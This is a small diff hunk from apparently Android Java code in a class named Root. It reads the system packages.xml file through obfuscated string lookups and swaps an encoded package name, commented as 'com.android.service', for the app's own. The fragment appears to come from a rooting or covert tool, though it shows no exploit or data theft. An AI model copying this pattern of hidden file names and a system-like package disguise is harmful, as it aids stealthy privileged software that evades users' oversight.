@@ -520,7 +520,7 @@ public class Root {
 			// packages.xml
 			FileInputStream fin = Status.getAppContext().openFileInput(Messages.getString("32_21"));
 			// com.android.service
-			PackageInfo pi = new PackageInfo(fin, Messages.getString("2_17"));
+			PackageInfo pi = new PackageInfo(fin, Status.getAppContext().getPackageName());
 
 			String path = pi.getPackagePath();
 
